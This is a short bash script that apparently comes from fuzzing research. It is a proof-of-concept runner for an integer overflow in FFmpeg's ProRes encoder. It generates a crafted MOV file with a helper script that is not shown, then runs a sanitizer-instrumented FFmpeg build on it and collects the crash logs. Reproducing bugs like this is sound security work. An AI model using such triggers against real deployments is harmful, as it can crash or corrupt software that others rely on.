#!/bin/bash
# PoC runner for integer overflow in ff_prores_kostya_encode_init()
set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "[*] Generating malicious MOV input..."
python3 vuln_001_gen.py

echo "[*] Running FFmpeg (ProRes 4444 encode with overflow dimensions)..."
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
  "$BIN" -i vuln_001_input.mov -c:v prores_ks -profile:v 4444 \
    -f null - > vuln_001_result.txt 2>&1 || true

echo "[*] Appending ASAN/UBSAN log if any..."
cat asan.log.* >> vuln_001_result.txt 2>/dev/null || true

echo "[+] Done. Check vuln_001_result.txt for results."
